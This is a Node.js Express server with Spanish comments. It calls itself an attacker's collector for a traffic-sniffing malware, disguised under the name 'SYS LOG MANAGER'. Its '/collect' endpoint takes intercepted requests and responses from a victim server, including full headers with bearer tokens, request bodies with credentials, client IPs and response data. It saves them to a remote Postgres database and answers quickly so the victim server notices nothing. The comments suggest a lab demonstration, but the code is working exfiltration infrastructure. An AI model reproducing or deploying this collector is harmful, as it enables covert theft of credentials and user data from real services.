const express = require('express');
const bodyParser = require('body-parser');
const { Pool } = require('pg');
require('dotenv').config();

// Inicializamos la aplicación Express para servir como endpoint de recolección
const app = express();
// Puerto donde escuchará nuestro servidor atacante
const PORT = 4000;

// Validación inicial de seguridad para asegurarnos de que la base de datos esté configurada.
// En un entorno de ataque real esto enviaría alertas ocultas, aquí evitamos que inicie si no hay DB.
if (!process.env.DATABASE_URL || process.env.DATABASE_URL === 'tu_conexion_de_neon_aqui') {
    console.error('\x1b[31m[ERROR] No se encontró la variable DATABASE_URL en el archivo .env\x1b[0m');
    console.error('Asegúrate de haber creado el archivo .env dentro de sys-log-manager con tu conexión de Neon.tech');
    process.exit(1);
}

// --- CONEXIÓN A LA BASE DE DATOS (Neon.tech) ---
// Usamos un Pool de conexiones PostgreSQL para manejar múltiples inserciones recurrentes
// sin sobrecargar el servidor de base de datos abriendo y cerrando conexiones constantemente.
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false, // Requerido para conectarse a Neon.tech, que usa certificados específicos
  },
  max: 10, // Máximo número de conexiones simultáneas en el pool (optimización)
  idleTimeoutMillis: 30000,
});

// Middleware para que nuestro servidor pueda comprender JSON en el cuerpo
// de la petición. El malware (sniffer) envía paquetes JSON.
app.use(bodyParser.json());

// --- ENDPOINT DE EXFILTRACIÓN ---
// Esta es la ruta oculta a la que el sniffer envía todos los datos interceptados
app.post('/collect', async (req, res) => {
    const data = req.body;
    
    // Mostramos en la consola del atacante los datos que están llegando
    console.log('\x1b[41m\x1b[37m[COLLECTOR] DATOS RECIBIDOS DEL SNIFFER:\x1b[0m');
    console.log(`Interceptado: ${data.method} ${data.url} → ${data.statusCode ?? 'SOLO-PETICIÓN'}`);

    try {
        // --- GUARDADO DE LA INFORMACIÓN EN LA NUBE ---
        // Insertamos el paquete de datos (tanto Request como Response) en nuestra base de datos remota
        // Utilizamos consultas parametrizadas ($1, $2, etc.) por seguridad y estabilidad.
        const query = `
            INSERT INTO sniffed_data
                (timestamp, method, url, headers, body, client_ip, status_code, response_body)
            VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
        `;
        
        // Mapeamos los datos JSON del sniffer a las columnas de PostgreSQL.
        // Convertimos campos complejos (objetos JSON) de nuevo a string para guardarlos en tipos de texto/JSONB
        const values = [
            data.timestamp,
            data.method,
            data.url,
            JSON.stringify(data.headers), // Almacena cabeceras completas (potencial robo de Authorization Bearer)
            JSON.stringify(data.body),    // Almacena el cuerpo completo (potencial impacto de inyección o robo de credenciales)
            data.clientIp,
            data.statusCode   ?? null,
            JSON.stringify(data.responseBody ?? null), // Datos devueltos al cliente
        ];

        // Ejecución de la consulta a Neon
        await pool.query(query, values);
        console.log('\x1b[32m[DB] Paquete (Petición+Respuesta) guardado con éxito en la base de datos Neon.tech.\x1b[0m');
        
    } catch (err) {
        // Si hay un error al guardar, simulamos un fallo en el servidor atacante
        console.error('\x1b[31m[DB ERROR] Fallo al guardar en Neon.tech:\x1b[0m', err.message);
    }

    console.log('--------------------------------------------------');
    
    // Es CRÍTICO responder con 200 OK rápidamente, de manera que la llamada en el sniffer
    // se resuelva y no detenga la ejecución normal del servidor de la víctima.
    res.status(200).send('OK');
});

// Prueba de conexión inicial a la base de datos al arrancar el servidor
pool.connect((err, client, release) => {
  if (err) {
    return console.error('\x1b[31m[COLLECTOR] Error conectando a Neon.tech:\x1b[0m', err.stack);
  }
  console.log('\x1b[32m[COLLECTOR] Conectado exitosamente a la base de datos Neon.tech.\x1b[0m');
  release(); // Liberamos el cliente de vuelta al pool
});

// Arrancamos el servidor colector a la escucha
app.listen(PORT, () => {
    console.log(`\x1b[36m[SYS LOG MANAGER] Servidor atacante (recolector) escuchando en puerto ${PORT}\x1b[0m`);
    console.log(`[SYS LOG MANAGER] Monitorizando datos entrantes y enviándolos hacia Neon.tech...`);
});
